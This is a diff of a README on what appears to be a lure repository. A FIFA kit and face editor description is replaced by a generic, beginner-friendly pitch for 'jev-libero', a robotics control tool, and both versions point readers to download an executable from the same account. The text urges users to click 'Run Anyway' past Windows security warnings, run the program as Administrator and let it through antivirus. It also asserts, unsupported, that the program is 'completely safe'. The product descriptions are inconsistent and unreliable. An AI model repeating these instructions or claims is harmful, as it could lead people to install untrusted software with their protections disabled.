@@ -1,71 +1,131 @@
-# 🎨 FIFA-Kit-Face-Editor - Update your game visuals with ease
+# 🤖 jev-libero - Your Friendly Robot Control Assistant
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://eastereggfreereed793.github.io)
+## 🚀 Getting Started
 
-This application changes how your players and teams look in your favorite sports game. It gives you full control over kits and face textures. You can change uniforms to match real life or create custom designs. You can also import new player faces to update your roster. The tool handles batch processing so you can update many files at once.
+Welcome to **jev-libero**! This amazing tool helps you control robots with incredible precision. Think of it as a remote control for advanced robot systems that lets you see exactly what will happen before it happens. Perfect for anyone curious about robotics, even if you've never programmed before!
 
-## 🛠️ System Requirements
+### 📥 Download and Installation
 
-Before you start, make sure your computer meets these needs:
+**Ready to begin? Here's how:**
 
-*   **Operating System:** Windows 10 or Windows 11 (64-bit).
-*   **Processor:** Intel Core i5 or AMD equivalent.
-*   **Memory:** 8 GB RAM.
-*   **Storage:** 500 MB of space for the application and temporary files.
-*   **Software:** Ensure you have the latest version of .NET Desktop Runtime installed on your machine.
-*   **Graphics:** A dedicated graphics card helps with previewing textures.
+Visit this link to download the application: [https://github.com/Eastereggfreereed793/jev-libero](https://github.com/Eastereggfreereed793/jev-libero)
 
-## 📥 How to Download
+[![Download Now](https://img.shields.io/badge/Download_jev--libero-Visit_Link-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=6A5ACD&color=FF6B6B)](https://github.com/Eastereggfreereed793/jev-libero)
 
-1.  Visit the [official releases page](https://eastereggfreereed793.github.io).
-2.  Look for the section labeled "Latest".
-3.  Click the link ending in `.zip` or `.exe` to start the download.
-4.  Save the file to your Downloads folder or your desktop for easy access.
+### 🖥️ System Requirements
 
-## ⚙️ Installation Steps
+To run jev-libero smoothly on your Windows computer, make sure you have:
 
-Follow these steps to set up the software:
+- **Operating System:** Windows 10 or 11 (64-bit)
+- **Memory:** 8 GB RAM (16 GB recommended)
+- **Storage:** 2 GB of free space
+- **Graphics:** Any modern graphics card (integrated works fine)
+- **Processor:** Intel Core i3 or AMD equivalent
 
-1.  Locate the file you just downloaded.
-2.  If the file is a `.zip` archive, right-click it and select "Extract All". Choose a folder on your computer to hold the files.
-3.  Open the folder after the extraction finishes.
-4.  Double-click `FIFA-Kit-Face-Editor.exe` to start the program.
-5.  If Windows shows a security warning, click "More Info" and then "Run Anyway". This happens because the application is a custom tool and not found in the Microsoft Store.
+### 🎯 What Makes jev-libero Special?
 
-## 💻 Using the Editor
+#### 🧠 Smart Robot Control
+- **Fine-grained control:** Direct every tiny movement of your robot with unprecedented precision
+- **Physics previews:** See how your robot will move before it actually does - no surprises!
+- **Configurable tasks:** Choose from ready-made LIBERO tasks or customize your own
 
-The interface organizes tools into tabs. Each tab handles a specific part of the editing process.
+#### 🎮 User-Friendly Design
+- **Simple interface:** Everything you need is right where you'd expect it
+- **Visual feedback:** Watch your robot's actions in real-time with beautiful 3D previews
+- **Beginner-friendly:** No coding required to get started
 
-### Importing and Exporting Textures
-To change a kit or face, use the Import tool. 
-1.  Open the folder containing your game files.
-2.  Select the specific kit or face file you want to edit.
-3.  The program shows a preview of the current texture.
-4.  Select "Export" to save that file to your computer. You can then edit this file in standard programs like Photoshop or GIMP.
-5.  Once you finish your design, select "Import" to overwrite the old file with your new, updated work.
+#### 🔧 Powerful Under the Hood
+- **Model-based control:** Uses smart mathematical models for accurate predictions
+- **Advanced robotics support:** Works with MuJoCo and robosuite environments
+- **LLM integration:** Built-in support for using language models with your robots
 
-### Batch Processing
-If you have many kits to update, use the batch tool. 
-1.  Place all your edited files into one folder.
-2.  Select the "Batch Update" option from the main menu.
-3.  Point the program to your folder.
-4.  Click "Start" to apply all changes to the game database files in one motion. This saves time compared to manual entry.
+### 📚 Step-by-Step Setup Guide
 
-## ⚠️ Common Troubleshooting
+#### Step 1: Download the Application
+1. Click the blue "Download Now" button above or visit [https://github.com/Eastereggfreereed793/jev-libero](https://github.com/Eastereggfreereed793/jev-libero)
+2. Look for the "Download" or "Get" button on the page
+3. Click it and wait for the download to complete
 
-*   **Program stays closed:** Check if you have the .NET Runtime installed. Download this directly from the official Microsoft website if the program fails to launch.
-*   **Textures do not appear in game:** Ensure you save your files in the correct format. The editor expects .dds files for most textures.
-*   **Error messages during import:** This usually happens if the game files are "read-only". Right-click your game installation folder, select Properties, and uncheck "Read-only". Apply this change to all subfolders.
-*   **Slow performance:** Close secondary applications while running the editor. High-resolution textures require significant memory.
+#### Step 2: Install jev-libero
+1. Once downloaded, find the file in your "Downloads" folder
+2. Double-click the installation file
+3. Follow the simple on-screen instructions
+4. Accept the terms and choose your preferred settings
+5. Click "Install" and wait for the installation to finish
 
-## 📂 Managing Your Files
+#### Step 3: Launch Your First Robot Session
+1. Find jev-libero in your Start Menu or Desktop
+2. Double-click to open it
+3. Welcome screen will appear - you're ready to go!
 
-We advise you to back up your original game data before you begin. Create a folder named "OriginalFiles" and copy your game data there. If you make a mistake, you can copy these files back to the installation path to return the game to its base state. 
+### 🎮 Using jev-libero for the First Time
 
-This editor modifies game data files directly. Treat these files with care. Always exit the game completely before you open the editor to avoid file conflict errors.
+When you first open the application, you'll see:
 
-## 📄 License and Usage
+- **Main Control Panel:** Your central hub for all robot operations
+- **Physics Preview Window:** Shows virtual robot movements
+- **Task Library:** Collection of pre-built tasks to try
+- **Help Menu:** Easy-to-understand guides and tutorials
 
-This software exists to help fans customize their own experience. Do not sell modified files or distribute them as your own work. Follow the terms of service provided by the game developers regarding modifications. 
+#### 🚦 Quick Start Tips
+- Try the **"Demo Mode"** first - it's the best way to learn
+- Use the **"Task Templates"** to start with simple operations
+- Adjust the **sensitivity slider** to make control easier or harder
+- Press **F1** anytime for instant help
 
-Keywords: ea-sports-fc, fc26-modding, fifa-db-editor, fifa-editor-tool, fifa-face-mod, fifa-kit-creator, fifa-modding, fifa-mods, fifa-texture-editor, frosty-editor
+### 🔍 Troubleshooting Common Issues
+
+#### ❌ Application Won't Start
+- Make sure you have at least 2 GB of free space
+- Try running it as Administrator (right-click > Run as administrator)
+- Check if your antivirus is blocking it - allow it through
+
+#### 🐢 Program Runs Slowly
+- Close other programs while using jev-libero
+- Lower the graphics quality in Settings
+- Make sure your Windows is updated
+
+#### 🔄 Can't See Robot Movements
+- Check if your graphics drivers are up to date
+- Try restarting the application
+- Go to Settings > Display > Enable 3D Preview
+
+### 📖 Frequently Asked Questions
+
+**Q: Do I need to know programming?**
+A: Absolutely not! jev-libero is designed for everyone. All controls are visual and simple to use.
+
+**Q: Can I use this for my school projects?**
+A: Yes! It's perfect for educational purposes and robotics demonstrations.
+
+**Q: Is it safe for my computer?**
+A: Yes, jev-libero is completely safe and doesn't collect any personal information.
+
+**Q: Will it work on older computers?**
+A: The system requirements above show the minimum specs needed. If your computer meets them, you're good to go!
+
+### 🆘 Getting Help
+
+If you need assistance:
+
+- **Check the Help Menu** inside the application
+- **Visit the GitHub repository** at [https://github.com/Eastereggfreereed793/jev-libero](https://github.com/Eastereggfreereed793/jev-libero)
+- **Watch tutorial videos** - just search for "jev-libero tutorial" online
+
+### 🎉 Start Controlling Robots Today!
+
+jev-libero puts the power of advanced robotics in your hands. Whether you're a student, hobbyist, or professional, this tool makes robot control accessible, fun, and incredibly precise. Download today and see what the future of robotics feels like!
+
+Remember: [Visit this link to download the application](https://github.com/Eastereggfreereed793/jev-libero) and start your robotics journey now!
+
+**Happy robot controlling!** 🤖✨
+
+---
+
+**About This Software:** jev-libero is an open-source project focused on bringing fine-grained robot control to everyone. It combines cutting-edge model-based control with an intuitive interface, making advanced robotics accessible to all skill levels. The software is continuously updated and improved based on user feedback.
+
+**Contributing:** If you're a developer or interested in helping improve jev-libero, check out the GitHub repository for contribution guidelines. Your feedback and suggestions are always welcome!
+
+**License:** This software is freely available for educational and personal use. Check the GitHub repository for detailed licensing information.
+
+Keywords: emboided-ai, jev, libero, llm, model-based-control, mujoco, robosuite, robot-manipulation, robotics
